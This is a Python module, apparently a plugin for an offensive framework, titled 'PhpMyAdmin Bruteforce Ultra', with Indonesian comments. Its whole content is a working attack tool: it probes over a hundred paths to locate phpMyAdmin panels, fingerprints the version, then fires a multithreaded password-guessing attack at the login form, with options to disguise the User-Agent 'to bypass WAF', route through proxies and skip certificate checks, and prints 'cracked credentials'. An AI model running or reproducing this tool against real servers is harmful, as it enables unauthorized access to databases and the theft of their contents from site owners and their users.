import requests
import threading
import time
from pathlib import Path
import sys
import random
import concurrent.futures
from queue import Queue
import re
import urllib.parse

# Suppress SSL warnings
try:
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except:
        pass

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

# Rich untuk table
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    from rich.text import Text
    from rich.columns import Columns
    from rich.align import Align
    from rich.live import Live
    from rich.layout import Layout
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False

MODULE_INFO = {
    "name": "PhpMyAdmin Bruteforce Ultra",
    "description": "Ultra fast phpMyAdmin bruteforce dengan progress bar yang tepat"
}

OPTIONS = {
    "TARGET": {
        "required": True,
        "default": "http://localhost/phpmyadmin",
        "description": "Target URL phpMyAdmin"
    },
    "USERNAME": {
        "required": True,
        "default": "root",
        "description": "Username atau file berisi usernames"
    },
    "PASSWORD": {
        "required": True, 
        "default": "password",
        "description": "Password atau file berisi passwords"
    },
    "USER_AGENT": {
        "required": False,
        "default": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "description": "User-Agent untuk bypass WAF"
    },
    "THREADS": {
        "required": False,
        "default": "50",
        "description": "Jumlah threads (1-200)"
    },
    "DELAY": {
        "required": False,
        "default": "0.01",
        "description": "Delay antara request (detik)"
    },
    "TIMEOUT": {
        "required": False,
        "default": "3",
        "description": "Timeout request (detik)"
    },
    "SSL_VERIFY": {
        "required": False,
        "default": "false",
        "description": "Verify SSL certificate (true/false)"
    },
    "PROXY": {
        "required": False,
        "default": "",
        "description": "Proxy server (optional)"
    },
    "MAX_ATTEMPTS": {
        "required": False,
        "default": "50000",
        "description": "Maximum attempts sebelum berhenti"
    }
}

def display_header():
    """Display header panel yang menarik"""
    if not RICH_AVAILABLE:
        return
    
    header_text = Text()
    header_text.append("🚀 ", style="bold red")
    header_text.append("ULTRA FAST ", style="bold yellow")
    header_text.append("PHPMyAdmin ", style="bold cyan")
    header_text.append("BRUTEFORCE", style="bold green")
    
    sub_text = Text()
    sub_text.append("⚡ ", style="bold yellow")
    sub_text.append("High-Speed Credential Testing Tool", style="bold white")
    
    header_panel = Panel(
        Align.center(header_text + "\n" + sub_text),
        border_style="bright_blue",
        padding=(1, 2),
        style="bold"
    )
    
    console.print(header_panel)

class UltraFastTargetScanner:
    """Class untuk scanning target yang ultra cepat"""
    
    def __init__(self, base_target, headers, ssl_verify, timeout, proxies):
        self.base_target = base_target
        self.headers = headers
        self.ssl_verify = ssl_verify
        self.timeout = timeout
        self.proxies = proxies
        self.found_paths = []
    
    def generate_paths_from_url(self, url):
        """Generate common paths berdasarkan URL target"""
        from urllib.parse import urlparse
        
        parsed = urlparse(url)
        base_domain = parsed.netloc
        base_path = parsed.path
        
        # Ekstrak bagian dari domain untuk pattern
        domain_parts = base_domain.split('.')
        domain_name = domain_parts[0] if domain_parts and domain_parts[0] not in ['www', 'http', 'https'] else "admin"
        
        # Extended phpMyAdmin paths dengan versi terbaru
        common_paths = [
            # Basic phpMyAdmin paths
            "", "/phpmyadmin", "/pma", "/myadmin", "/admin", 
            "/mysql", "/dbadmin", "/PMA", "/phpMyAdmin",
            
            # Domain-based paths
            f"/{domain_name}", f"/{domain_name}admin", f"/{domain_name}_admin",
            f"/{domain_name}-admin", f"/{domain_name}mysql", f"/{domain_name}db",
            
            # Subdirectory paths
            "/web/phpmyadmin", "/db/phpmyadmin", "/sql/phpmyadmin",
            "/admin/phpmyadmin", "/mysql/phpmyadmin", "/phpmyadmin2",
            "/public/phpmyadmin", "/assets/phpmyadmin", "/static/phpmyadmin",
            
            # Version specific paths (sampai versi 6+)
            "/phpMyAdmin-6.0", "/phpMyAdmin-5.2", "/phpMyAdmin-5.1", 
            "/phpMyAdmin-5.0", "/phpMyAdmin-4.9", "/phpMyAdmin-4.8",
            "/phpMyAdmin-4.7", "/phpMyAdmin-4.6", "/phpMyAdmin-4.5",
            "/phpMyAdmin-4.4", "/phpMyAdmin-4.3", "/phpMyAdmin-4.2",
            "/phpMyAdmin-4.1", "/phpMyAdmin-4.0", "/phpMyAdmin-3.5",
            
            # Newer version patterns
            "/pma6", "/pma5", "/pma4", "/myadmin6", "/myadmin5",
            
            # Alternative names
            "/db", "/sql", "/database", "/dba", "/mysql-admin",
            "/myadmin", "/adminer", "/phpsql", "/websql", "/webdb",
            "/dbweb", "/phpmy", "/mysqladmin", "/mysqldb",
            
            # Common CMS integrations
            "/cpanel", "/whm", "/plesk", "/webmin", "/directadmin",
            "/xampp", "/wamp", "/lampp", "/mamp", "/ampps",
            
            # Development paths
            "/dev/phpmyadmin", "/test/phpmyadmin", "/demo/phpmyadmin",
            "/stage/phpmyadmin", "/staging/phpmyadmin",
            
            # Hidden paths
            "/_phpmyadmin", "/_pma", "/.phpmyadmin", "/.pma",
            "/hidden/phpmyadmin", "/secret/phpmyadmin", "/private/phpmyadmin",
            
            # Backup paths
            "/backup/phpmyadmin", "/bak/phpmyadmin", "/old/phpmyadmin",
            "/new/phpmyadmin", "/temp/phpmyadmin",
            
            # Common patterns
            "/phpMyAdmin-%", "/pma-%", "/phpmyadmin_old", "/phpmyadmin_new",
            "/phpmyadmin2024", "/phpmyadmin2023", "/phpmyadmin2022",
            
            # Reverse proxy common paths
            "/tools/phpmyadmin", "/apps/phpmyadmin", "/util/phpmyadmin",
            "/manager/phpmyadmin", "/system/phpmyadmin", "/control/phpmyadmin",
        ]
        
        # Remove duplicates and empty strings, then return
        unique_paths = list(dict.fromkeys([p for p in common_paths if p is not None]))
        return unique_paths
    
    def is_valid_version(self, version_str):
        """Validate jika string adalah version yang valid (sampai versi 6+)"""
        if not version_str:
            return False
        
        if re.match(r'^\d+\.\d+(\.\d+)?$', version_str):
            parts = version_str.split('.')
            if all(0 <= int(part) < 1000 for part in parts if part.isdigit()):
                major_version = int(parts[0])
                # Support phpMyAdmin versi 2 sampai 6+
                if 2 <= major_version <= 6:
                    return True
        
        return False
    
    def scan_paths(self):
        """Scan path dengan common paths yang digenerate dari URL"""
        # Generate paths dari URL target
        common_paths = self.generate_paths_from_url(self.base_target) 
        total = len(common_paths)
        
        if RICH_AVAILABLE:
            from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
            progress_columns = [
                TextColumn("{task.description}"),
                BarColumn(bar_width=None),
                TextColumn("{task.completed}/{task.total}"),
                TimeElapsedColumn(),
                TimeRemainingColumn(),
            ]
        
            def build_status_panel(current_path, tested_count, found_count):
                table = Table.grid(expand=True)
                table.add_column(ratio=3)
                table.add_column(ratio=1, justify="right")
                left = (
                    f"🔄 Testing: [bold]{current_path}[/bold]\n"
                    f"🧭 Tested: [cyan]{tested_count}/{total}[/cyan]\n"
                    f"✅ Found: [green]{found_count}[/green]"
                )
                right = f"Target: [bold]{self.base_target}[/bold]"
                table.add_row(left, right)
                return Panel(table, title="📡 Scan Status", border_style="magenta", padding=(1, 2))

            with Progress(*progress_columns, console=console, transient=False) as progress:
                task = progress.add_task("Scanning paths...", total=total)
                with Live(build_status_panel("-", 0, 0), refresh_per_second=6, console=console) as live:
                    tested = 0
                    found_count = 0
                    for path in common_paths:
                        current_path = path or "/"
                        progress.update(task, description=f"Testing: {current_path}", advance=1)
                        test_url = f"{self.base_target.rstrip('/')}" + current_path
                        status_info = self.check_url_status(test_url)
                        tested += 1
                        if status_info.get("accessible"):
                            self.found_paths.append(status_info)
                            found_count += 1

                        # update live panel with concise info
                        live.update(build_status_panel(current_path, tested, found_count))
                        # tiny sleep to avoid terminal flooding when scanning extremely fast
                        time.sleep(0.005)
        else:
            # fallback behavior: tqdm or simple loop
            if TQDM_AVAILABLE:
                progress_bar = tqdm(total=total, desc="Scanning paths", unit="path", ncols=80)
            else:
                progress_bar = None
            found_count = 0
            tested = 0
            for path in common_paths:
                tested += 1
                test_url = f"{self.base_target.rstrip('/')}" + (path or "/")
                if TQDM_AVAILABLE:
                    tqdm.write(f"🔍 [{tested:3d}/{total:3d}] Testing: {path or '/'}")
                status_info = self.check_url_status(test_url)
                if progress_bar:
                    progress_bar.update(1)
                if status_info.get("accessible"):
                    self.found_paths.append(status_info)
                    found_count += 1
                    if TQDM_AVAILABLE:
                        tqdm.write(f"✅ FOUND: {path or '/'} -> {status_info['url']}")
            if progress_bar:
                progress_bar.close()
        
        if self.found_paths and RICH_AVAILABLE:
            self.display_scan_results()
        elif not self.found_paths and RICH_AVAILABLE:
            console.print(Panel(
                "❌ [bold red]No accessible phpMyAdmin paths found![/bold red]\n"
                f"💡 Tried {len(common_paths)} different paths\n"
                f"💡 Support: phpMyAdmin v2.0 - v6.0+\n"
                "💡 The target might not have phpMyAdmin installed or uses custom path",
                border_style="red",
                padding=(1, 2)
            ))
        return self.found_paths

    def check_url_status(self, url):
        """Check status URL dengan version detection yang lebih baik"""
        try:
            response = requests.get(
                url,
                headers=self.headers,
                verify=self.ssl_verify,
                timeout=5,
                proxies=self.proxies,
                allow_redirects=True
            )
            
            html = response.text
            final_url = response.url
            
            # Enhanced version detection dengan multiple methods
            version = self.detect_phpmyadmin_version(final_url, html, response.headers)
            
            accessible = response.status_code in [200, 301, 302, 401, 403]
            
            return {
                "url": final_url,
                "status_code": response.status_code,
                "accessible": accessible,
                "ssl": final_url.startswith("https"),
                "server": response.headers.get('Server', 'N/A'),
                "x_powered_by": response.headers.get('X-Powered-By', 'N/A'),
                "title": self.extract_title(html),
                "version": version,
                "content_length": len(html),
            }
            
        except Exception as e:
            return {
                "url": url, 
                "status_code": "ERROR", 
                "accessible": False, 
                "version": "Unknown",
                "error": str(e)
            }
    
    def detect_phpmyadmin_version(self, url, html, headers):
        """Detect phpMyAdmin version dengan multiple advanced methods"""
        version = "Unknown"
        
        # Method 1: Check HTML content patterns
        version = self.extract_version_from_html(html)
        if version != "Unknown":
            return version
        
        # Method 2: Check URL path patterns
        version = self.check_url_for_version(url)
        if version != "Unknown":
            return version
        
        return "Unknown"
    
    def extract_version_from_html(self, html):
        """Extract version dari HTML dengan patterns yang lebih komprehensif"""
        if not html:
            return "Unknown"
        
        text = html[:300000]
        
        patterns = [
            r'phpMyAdmin[^<]*?([0-9]+\.[0-9]+\.[0-9]+)',
            r'Version[:\s]*([0-9]+\.[0-9]+\.[0-9]+)',
            r'v([0-9]+\.[0-9]+\.[0-9]+)',
            r'phpMyAdmin[^0-9]*([0-9]+\.[0-9]+)',
            r'PMA_VERSION[\s]*=[\s]*["\']([0-9\.]+)["\']',
            r'<meta[^>]*content=["\'][^"\']*phpMyAdmin[^"\']*([0-9\.]+)',
            r'<title>[^<]*phpMyAdmin[^<]*([0-9\.]+)',
        ]
        
        for pattern in patterns:
            try:
                matches = re.findall(pattern, text, re.IGNORECASE)
                for match in matches:
                    if self.is_valid_version(match):
                        return match
            except:
                continue
        
        return "Unknown"
    
    def check_url_for_version(self, url):
        """Check URL pattern untuk version clues"""
        patterns = [
            r'phpmyadmin[-\s]*([0-9]+\.[0-9]+\.[0-9]+)',
            r'phpmyadmin[-\s]*([0-9]+\.[0-9]+)',
            r'pma[-\s]*([0-9]+\.[0-9]+)',
            r'phpMyAdmin-([0-9]+\.[0-9]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, url, re.IGNORECASE)
            for match in matches:
                if self.is_valid_version(match):
                    return match
        
        return "Unknown"
    
    def is_valid_version(self, version_str):
        """Validate jika string adalah version yang valid"""
        if not version_str:
            return False
        
        if re.match(r'^\d+\.\d+(\.\d+)?$', version_str):
            parts = version_str.split('.')
            if all(0 <= int(part) < 1000 for part in parts if part.isdigit()):
                major_version = int(parts[0])
                if 2 <= major_version <= 5:
                    return True
        
        return False
    
    def extract_title(self, html):
        """Extract title dari HTML"""
        title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return title_match.group(1) if title_match else "No Title"
    
    def display_scan_results(self):
        """Display hasil scanning dengan panel"""
        if not self.found_paths:
            return
        
        table = Table(
            title="🎯 Target Discovery Results", 
            box=box.DOUBLE_EDGE, 
            show_header=True, 
            header_style="bold magenta"
        )
        table.add_column("Status", style="bold", width=30, overflow="fold")
        table.add_column("URL", style="cyan", overflow="fold", width=30)
        table.add_column("Code", justify="center", width=30, overflow="fold")
        table.add_column("Server", style="yellow", width=30, overflow="fold")
        table.add_column("SSL", justify="center", width=30)
        table.add_column("Version", style="bold green", justify="center", width=30, overflow="fold")
        
        for result in self.found_paths:
            status_emoji = self.get_status_emoji(result['status_code'])
            ssl_icon = "🔐" if result["ssl"] else "🌐"
            status_code = result['status_code']
            version = result.get("version", "Unknown")
            
            version_display = version
            if version != "Unknown":
                version_display = f"[green]{version}[/green]"
            else:
                version_display = f"[yellow]{version}[/yellow]"
            
            table.add_row(
                f"{status_emoji}",
                f"{result['url']}",
                f"[bold]{status_code}[/bold]",
                result['server'][:15],
                ssl_icon,
                version_display,
            )
        
        results_panel = Panel(
            table,
            title="📊 SCAN COMPLETED",
            border_style="green",
            padding=(1, 1)
        )
        
        console.print(results_panel)
    
    def get_status_emoji(self, status_code):
        """Get emoji untuk status code"""
        emoji_map = {
            200: "✅", 301: "🔄", 302: "🔄", 
            403: "🚫", 401: "🔐", 500: "💥"
        }
        return emoji_map.get(status_code, "❓")

class UltraFastLoginChecker:
    """Class untuk cek login yang ultra cepat"""
    
    @staticmethod
    def check_login_success(response):
        """Check login success dengan method yang sangat cepat"""
        text = response.text.lower()
        
        # Very quick success checks
        if any(indicator in text for indicator in ["mainframeset", "navigation.php", "server version", "frameborder"]):
            return True
        
        # Very quick failure checks  
        if any(indicator in text for indicator in ["access denied", "cannot log in", "login"]):
            return False
        
        # Quick content-based decision
        return len(response.text) > 3000 and "login" not in text

class UltraFastPhpMyAdminBruteforce:
    """Main class untuk bruteforce dengan progress bar yang tepat"""
    
    def __init__(self, options):
        self.options = options
        
        # Initialize queue FIRST before any other methods
        self.credential_queue = Queue()
        self.results = {
            "found_credentials": [],
            "attempts": 0,
            "successful_attempts": 0,
            "start_time": None,
            "current_speed": 0
        }
        self.stop_event = threading.Event()
        self.credentials_found = False
        
        # Now setup components that use the queue
        self.setup_components()
    
    def setup_components(self):
        """Setup komponen"""
        self.headers = {
            'User-Agent': self.options.get("USER_AGENT"),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        self.ssl_verify = self.options.get("SSL_VERIFY", "false").lower() == "true"
        self.timeout = int(self.options.get("TIMEOUT", "3"))
        self.threads = max(1, min(200, int(self.options.get("THREADS", "50"))))
        self.delay = float(self.options.get("DELAY", "0.01"))
        self.max_attempts = int(self.options.get("MAX_ATTEMPTS", "50000"))
        
        # Setup proxies
        self.proxies = {}
        proxy = self.options.get("PROXY", "").strip()
        if proxy:
            self.proxies = {"http": proxy, "https": proxy}
        
        # Load credentials dan buat queue
        self.load_credentials_to_queue()
        
        # Initialize components
        self.target_scanner = UltraFastTargetScanner(
            self.options.get("TARGET", ""),
            self.headers,
            self.ssl_verify,
            self.timeout,
            self.proxies
        )
        
        self.login_checker = UltraFastLoginChecker()
        
        # Threading
        self.lock = threading.Lock()
        self.progress_bar = None
    
    def load_credentials_to_queue(self):
        """Load semua credentials ke dalam queue untuk progress yang tepat"""
        usernames = self.load_wordlist(self.options.get("USERNAME", ""))
        passwords = self.load_wordlist(self.options.get("PASSWORD", ""))
        
        total_combinations = len(usernames) * len(passwords)
        
        if RICH_AVAILABLE:
            console.print(Panel(
                f"📊 [cyan]Credential Queue Preparation[/cyan]\n"
                f"👥 Usernames: [yellow]{len(usernames)}[/yellow]\n"
                f"🔑 Passwords: [yellow]{len(passwords)}[/yellow]\n"
                f"🎯 Total Combinations: [red]{total_combinations:,}[/red]",
                border_style="blue",
                padding=(1, 2)
            ))
        
        # Masukkan semua kombinasi ke queue
        for username in usernames:
            for password in passwords:
                if self.credential_queue.qsize() < self.max_attempts:
                    self.credential_queue.put((username, password))
                else:
                    break
        
        self.total_attempts = min(total_combinations, self.max_attempts)
    
    def load_wordlist(self, input_str):
        """Load wordlist"""
        try:
            if Path(input_str).is_file():
                with open(input_str, 'r', encoding='utf-8', errors='ignore') as f:
                    return [line.strip() for line in f if line.strip()]
            else:
                return [input_str]
        except:
            return [input_str]
    
    def create_session(self):
        """Create session dengan connection pooling"""
        session = requests.Session()
        session.headers.update(self.headers)
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=1
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        return session
    
    def run(self):
        # Phase 1: Fast Target Scanning
        found_paths = self.target_scanner.scan_paths()
        if not found_paths:
            if RICH_AVAILABLE:
                console.print(Panel(
                    "❌ [bold red]TARGET DISCOVERY FAILED[/bold red]\n"
                    "No accessible phpMyAdmin paths found!",
                    border_style="red",
                    padding=(1, 2)
                ))
            return
        
        target_url = found_paths[0]["url"]
        
        # Phase 2: Ultra Fast Bruteforce dengan Progress Bar yang Tepat
        self.start_bruteforce_with_proper_progress(target_url)
        
        # Phase 3: Results
        self.display_final_results()
    
    def start_bruteforce_with_proper_progress(self, target_url):
        """Start bruteforce dengan progress bar yang tepat"""
        if RICH_AVAILABLE:
            console.print(Panel(
                f"🔥 [bold red]BRUTEFORCE CONFIGURATION[/bold red]\n"
                f"🎯 Target: [cyan]{target_url}[/cyan]\n"
                f"📊 Total Combinations: [yellow]{self.total_attempts:,}[/yellow]\n"
                f"🚀 Threads: [green]{self.threads}[/green]\n"
                f"⚡ Delay: [blue]{self.delay}s[/blue]",
                border_style="red",
                padding=(1, 2)
            ))
        
        # Setup progress bar dengan total yang tepat
        if TQDM_AVAILABLE:
            self.progress_bar = tqdm(
                total=self.total_attempts,
                desc="Bruteforcing",
                unit="attempt",
                dynamic_ncols=True,
                bar_format="{l_bar}{bar:20}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]",
                position=0,  # PASTIKAN di position 0
                leave=True   # Biarkan progress bar setelah selesai
            )
            # Tambah postfix untuk info tambahan
            self.progress_bar.set_postfix_str("Starting...")
        else:
            console.print(f"🔄 Starting bruteforce with {self.total_attempts:,} combinations...")
        
        self.results["start_time"] = time.time()
        
        # Start worker threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(
                target=self.bruteforce_worker, 
                args=(target_url,),
                name=f"Worker-{i+1}"
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Monitor progress dengan update real-time
        last_attempts = 0
        last_time = time.time()
        
        try:
            while (not self.stop_event.is_set() and 
                   self.results["attempts"] < self.total_attempts and
                   not self.credentials_found):
                
                time.sleep(0.5)  # Update setiap 0.5 detik
                
                # Calculate current speed
                current_time = time.time()
                attempts_diff = self.results["attempts"] - last_attempts
                time_diff = current_time - last_time
                
                if time_diff > 0:
                    current_speed = attempts_diff / time_diff
                    self.results["current_speed"] = current_speed
                    
                    # Update progress bar postfix
                    if TQDM_AVAILABLE and self.progress_bar:
                        elapsed = current_time - self.results["start_time"]
                        eta = (self.total_attempts - self.results["attempts"]) / current_speed if current_speed > 0 else 0
                        postfix = f"Speed: {current_speed:,.0f}/s | ETA: {eta:.0f}s"
                        self.progress_bar.set_postfix_str(postfix)
                
                last_attempts = self.results["attempts"]
                last_time = current_time
                
                # Check jika semua kombinasi sudah dicoba
                if self.credential_queue.empty():
                    break
                    
        except KeyboardInterrupt:
            self.stop_event.set()
            if RICH_AVAILABLE:
                console.print("\n🛑 [yellow]Bruteforce interrupted by user[/yellow]")
        
        # Tunggu semua thread selesai
        self.stop_event.set()
        for thread in threads:
            thread.join(timeout=2)
        
        elapsed_time = time.time() - self.results["start_time"]
        
        if TQDM_AVAILABLE and self.progress_bar:
            self.progress_bar.close()
        
        if RICH_AVAILABLE:
            attempts_per_second = self.results["attempts"] / elapsed_time if elapsed_time > 0 else 0
            console.print(Panel(
                f"⏰ [cyan]Execution Time:[/cyan] {elapsed_time:.2f} seconds\n"
                f"📈 [green]Average Speed:[/green] {attempts_per_second:,.1f} attempts/second\n"
                f"📊 [yellow]Peak Speed:[/yellow] {self.results['current_speed']:,.1f} attempts/second\n"
                f"🎯 [bold magenta]Status:[/bold magenta] {'COMPLETED' if not self.credentials_found else 'CREDENTIALS FOUND'}",
                title="📊 EXECUTION SUMMARY",
                border_style="cyan",
                padding=(1, 2)
            ))
    
    def bruteforce_worker(self, target_url):
        """Worker thread untuk bruteforce"""
        session = self.create_session()
        
        while (not self.stop_event.is_set() and 
               not self.credentials_found and
               self.results["attempts"] < self.total_attempts):
            
            try:
                # Ambil credential dari queue dengan timeout
                username, password = self.credential_queue.get(timeout=1)
            except:
                break  # Queue kosong atau timeout
            
            success = self.try_login(session, target_url, username, password)
            
            with self.lock:
                self.results["attempts"] += 1
                
                if success:
                    self.results["successful_attempts"] += 1
                    self.results["found_credentials"].append((username, password))
                    self.credentials_found = True
                    self.stop_event.set()
                    
                    if RICH_AVAILABLE:
                        # Clear progress bar area sebelum print success
                        if TQDM_AVAILABLE and self.progress_bar:
                            self.progress_bar.clear()
                        
                        console.print("\n" + "="*70)
                        success_panel = Panel(
                            f"🎉 [bold green]CREDENTIALS SUCCESSFULLY CRACKED![/bold green]\n\n"
                            f"👤 [cyan]Username:[/cyan] {username}\n"
                            f"🔑 [yellow]Password:[/yellow] {password}\n"
                            f"📊 [blue]Attempts Made:[/blue] {self.results['attempts']:,}\n"
                            f"⏰ [magenta]Progress:[/magenta] {self.results['attempts']:,}/{self.total_attempts:,}",
                            title="💎 SUCCESS",
                            border_style="bright_green",
                            padding=(2, 3)
                        )
                        console.print(success_panel)
                        console.print("="*70)
            
            # Update progress bar - HANYA di worker utama
            if TQDM_AVAILABLE and self.progress_bar and not self.credentials_found:
                self.progress_bar.update(1)
            
            # Delay
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Tandai task selesai
            self.credential_queue.task_done()
        
        session.close()
    
    def try_login(self, session, target_url, username, password):
        """Attempt login"""
        login_url = f"{target_url}/index.php"
        
        try:
            # Get login page
            response = session.get(
                login_url,
                verify=self.ssl_verify,
                timeout=2,
                proxies=self.proxies
            )
            
            # Simple login data
            data = {
                'pma_username': username,
                'pma_password': password,
                'server': '1',
            }
            
            # Attempt login
            response = session.post(
                login_url,
                data=data,
                verify=self.ssl_verify,
                timeout=2,
                proxies=self.proxies,
                allow_redirects=True
            )
            
            return self.login_checker.check_login_success(response)
                
        except:
            return False
    
    def display_final_results(self):
        """Display results"""
        if not RICH_AVAILABLE:
            return
            
        summary_content = (
            f"🎯 [bold cyan]Target:[/bold cyan] {self.options.get('TARGET')}\n"
            f"⏰ [bold yellow]Total Attempts:[/bold yellow] {self.results['attempts']:,}\n"
            f"✅ [bold green]Successful Logins:[/bold green] {self.results['successful_attempts']}\n"
            f"🔑 [bold red]Credentials Found:[/bold red] {len(self.results['found_credentials'])}\n"
            f"📊 [bold magenta]Total Combinations:[/bold magenta] {self.total_attempts:,}"
        )
        
        summary_panel = Panel(
            summary_content,
            title="📊 FINAL RESULTS SUMMARY",
            border_style="bright_blue",
            padding=(1, 2)
        )
        
        console.print(summary_panel)
        
        if self.results["found_credentials"]:
            table = Table(
                title="🎉 CRACKED CREDENTIALS", 
                box=box.DOUBLE_EDGE, 
                header_style="bold green"
            )
            table.add_column("Username", style="bold white", justify="center")
            table.add_column("Password", style="bold yellow", justify="center")
            table.add_column("Status", style="bold green", justify="center")
            
            for username, password in self.results["found_credentials"]:
                table.add_row(username, password, "✅ VALID")
            
            credentials_panel = Panel(
                table,
                title="💎 SUCCESSFUL CRACKS",
                border_style="green",
                padding=(1, 1)
            )
            
            console.print(credentials_panel)
        else:
            console.print(Panel(
                "❌ [bold red]No valid credentials found during bruteforce[/bold red]\n"
                f"💡 Tried {self.results['attempts']:,} combinations\n"
                "💡 Try using different wordlists or target",
                border_style="red",
                padding=(1, 2)
            ))

def run(session, options):
    """Main function"""
    bruteforcer = UltraFastPhpMyAdminBruteforce(options)
    bruteforcer.run()
